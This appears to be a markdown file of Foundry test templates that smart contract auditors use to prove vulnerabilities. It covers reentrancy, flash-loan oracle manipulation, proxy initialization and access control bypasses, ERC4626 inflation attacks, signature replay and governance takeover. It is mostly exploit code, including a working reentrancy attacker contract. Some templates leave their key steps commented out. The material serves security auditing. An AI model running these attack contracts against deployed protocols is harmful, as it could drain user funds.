# Proof of Concept Templates

Foundry-based templates for demonstrating common vulnerabilities.
Copy and adapt these to prove exploits in audited contracts.

---

## Reentrancy PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            vault.withdraw();
        }
    }
}

contract ReentrancyPoC is Test {
    IVulnerableVault vault;
    ReentrancyAttacker attacker;

    function setUp() public {
        // Deploy vulnerable contract
        // vault = IVulnerableVault(address(new VulnerableVault()));

        // Fund vault with victim deposits
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Deploy attacker
        attacker = new ReentrancyAttacker(address(vault));
    }

    function test_ReentrancyExploit() public {
        uint256 vaultBalanceBefore = address(vault).balance;

        // Attacker deposits 1 ETH and exploits reentrancy
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Attacker drained more than deposited
        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vault).balance, vaultBalanceBefore);

        console.log("Vault balance before:", vaultBalanceBefore);
        console.log("Vault balance after:", address(vault).balance);
        console.log("Attacker profit:", address(attacker).balance - 1 ether);
    }
}
```

---

## Flash Loan Attack PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IFlashLoanProvider {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IVulnerableProtocol {
    function priceOracle() external view returns (uint256);
    function deposit(uint256 amount) external;
    function borrow(uint256 amount) external;
}

contract FlashLoanAttacker {
    IFlashLoanProvider public lender;
    IVulnerableProtocol public target;
    IERC20 public token;

    constructor(address _lender, address _target, address _token) {
        lender = IFlashLoanProvider(_lender);
        target = IVulnerableProtocol(_target);
        token = IERC20(_token);
    }

    function attack() external {
        // Borrow large amount to manipulate price
        uint256 borrowAmount = 1_000_000 ether;
        lender.flashLoan(address(token), borrowAmount, "");
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // 1. Manipulate price oracle (e.g., swap in AMM)
        // 2. Exploit protocol at manipulated price
        // 3. Return flash loan + fee

        // Repay flash loan
        IERC20(tokenAddr).transfer(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract FlashLoanPoC is Test {
    function test_FlashLoanPriceManipulation() public {
        // Setup: fork mainnet at specific block
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), 18000000);

        uint256 priceBefore = 0; // target.priceOracle();

        // Execute attack
        // attacker.attack();

        uint256 priceAfter = 0; // target.priceOracle();

        // Price was manipulated
        // assertGt(priceAfter, priceBefore * 2);
    }
}
```

---

## Oracle Manipulation PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IVulnerableLending {
    function getPrice() external view returns (uint256);
    function borrow(uint256 collateral) external returns (uint256);
}

contract OracleManipulationPoC is Test {
    IUniswapV2Pair pair;
    IVulnerableLending lending;

    function setUp() public {
        // Fork mainnet
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    }

    function test_SpotPriceManipulation() public {
        // Get price before manipulation
        uint256 priceBefore = lending.getPrice();
        console.log("Price before:", priceBefore);

        // Manipulate AMM reserves with large swap
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 swapAmount = uint256(reserve0) / 2; // 50% of reserves

        // Execute swap to skew price
        // pair.swap(swapAmount, 0, address(this), "");

        // Price after manipulation
        uint256 priceAfter = lending.getPrice();
        console.log("Price after:", priceAfter);

        // Exploit: borrow at manipulated price
        // uint256 borrowed = lending.borrow(1 ether);

        // Restore AMM (swap back)
        // Keep profit
    }
}
```

---

## Access Control Bypass PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVulnerableContract {
    function initialize(address owner) external;
    function adminWithdraw(address to) external;
    function owner() external view returns (address);
}

contract AccessControlPoC is Test {
    IVulnerableContract target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy uninitialized implementation
        // target = IVulnerableContract(address(new VulnerableImpl()));
    }

    function test_UninitializedProxy() public {
        // Attacker calls initialize on implementation directly
        vm.prank(attacker);
        target.initialize(attacker);

        // Attacker is now owner
        assertEq(target.owner(), attacker);

        // Attacker can drain funds
        vm.prank(attacker);
        target.adminWithdraw(attacker);
    }

    function test_MissingAccessControl() public {
        // Function lacks onlyOwner modifier
        vm.prank(attacker);
        target.adminWithdraw(attacker); // Should revert but doesn't
    }
}
```

---

## First Depositor / Inflation Attack PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function totalSupply() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract InflationAttackPoC is Test {
    IERC4626 vault;
    IERC20 token;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        // Deploy vault and token
        // Fund attacker and victim
        deal(address(token), attacker, 10001 ether);
        deal(address(token), victim, 10000 ether);
    }

    function test_InflationAttack() public {
        // Step 1: Attacker is first depositor, deposits 1 wei
        vm.startPrank(attacker);
        token.transfer(address(vault), 1); // Approve first
        vault.deposit(1, attacker);

        // Attacker has 1 share
        assertEq(vault.balanceOf(attacker), 1);

        // Step 2: Attacker donates large amount directly
        token.transfer(address(vault), 10000 ether);
        vm.stopPrank();

        // Vault now has 10000 ETH + 1 wei, but only 1 share exists
        // Price per share = 10000 ETH

        // Step 3: Victim deposits 10000 ETH
        vm.startPrank(victim);
        // token.approve(address(vault), 10000 ether);
        uint256 victimShares = vault.deposit(10000 ether, victim);
        vm.stopPrank();

        // Victim gets 0 or 1 shares due to rounding!
        console.log("Victim shares:", victimShares);
        console.log("Attacker shares:", vault.balanceOf(attacker));

        // Step 4: Attacker redeems their 1 share
        vm.prank(attacker);
        uint256 attackerRedeemed = vault.redeem(1, attacker, attacker);

        console.log("Attacker redeemed:", attackerRedeemed);
        // Attacker gets ~50% of all assets (their donation + half of victim's deposit)
    }
}
```

---

## Signature Replay PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVulnerablePermit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function nonces(address) external view returns (uint256);
}

contract SignatureReplayPoC is Test {
    IVulnerablePermit token;

    function test_CrossChainReplay() public {
        // Same signature valid on multiple chains if chainId not in hash

        // Fork Chain A
        // vm.createSelectFork("chain_a_rpc");
        // Execute permit with signature

        // Fork Chain B
        // vm.createSelectFork("chain_b_rpc");
        // Replay same signature - should fail but doesn't
    }

    function test_MissingNonce() public {
        // If nonce not incremented, same signature can be reused
        uint256 nonceBefore = token.nonces(address(this));

        // Execute permit
        // token.permit(...);

        uint256 nonceAfter = token.nonces(address(this));

        // Nonce should increment
        assertEq(nonceAfter, nonceBefore + 1);
    }
}
```

---

## Governance Attack PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    function castVote(uint256 proposalId, uint8 support) external;
    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external;
    function quorum(uint256 blockNumber) external view returns (uint256);
}

interface IToken {
    function delegate(address) external;
    function balanceOf(address) external view returns (uint256);
}

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

contract GovernanceAttackPoC is Test {
    IGovernor governor;
    IToken govToken;
    IFlashLoan flashLender;

    address attacker = makeAddr("attacker");

    function test_FlashLoanGovernance() public {
        // Check if voting power uses current balance (vulnerable)
        // vs snapshots (safe)

        uint256 quorum = governor.quorum(block.number - 1);
        console.log("Quorum required:", quorum);

        // Flash borrow governance tokens
        // flashLender.flashLoan(quorum * 2);

        // In callback:
        // 1. Delegate to self
        // 2. Create malicious proposal
        // 3. Vote
        // 4. Return tokens

        // If using live balances, attack succeeds
    }
}
```

---

## Test Execution

```bash
# Run specific PoC
forge test --match-test test_ReentrancyExploit -vvvv

# Run with gas report
forge test --match-test test_InflationAttack -vvvv --gas-report

# Run on mainnet fork
forge test --match-test test_FlashLoanPriceManipulation --fork-url $ETH_RPC_URL -vvvv

# Run with specific block
forge test --fork-url $ETH_RPC_URL --fork-block-number 18000000 -vvvv
```
